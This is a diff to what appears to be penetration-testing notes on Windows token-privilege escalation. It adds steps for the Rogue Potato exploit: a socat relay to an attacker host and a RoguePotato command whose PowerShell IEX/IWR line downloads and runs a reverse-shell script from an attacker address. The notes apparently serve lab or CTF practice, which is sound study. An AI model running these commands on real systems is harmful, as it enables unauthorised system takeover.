@@ -780,7 +780,12 @@ SeImpersonatePrivilege: can be exploited with rottenpotato, juicypotato\
 SeAssignPrimaryPrivilege: can be exploited rottenpotato, juicypotato\
 SeBackupPrivilege: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\
 etc. \
-JuicyPotato won't work with Windows 10 1809 and Windows Server 2019 and above. Try Rogue Potato instead.
+JuicyPotato won't work with Windows 10 1809 and Windows Server 2019 and above. Try **Rogue Potato** instead: \
+Transfer RoguePotato.exe over the target machine. \
+On local machine: 
+```socat tcp-listen:135,reuseaddr,fork tcp:$LHOST:$LPORT``` \
+Set up a Python server to transfer powershell payload over and a netcat listner. \
+On target machine: ```.\RoguePotato.exe -r 10.10.14.x -e "powershell IEX( IWR http://10.10.14.x:6666/rev.ps1 -UseBasicParsing)" -l 9000```
 
 If Windows 7 is detected, check for potential Eternal Blue or Kernel Exploit.
 
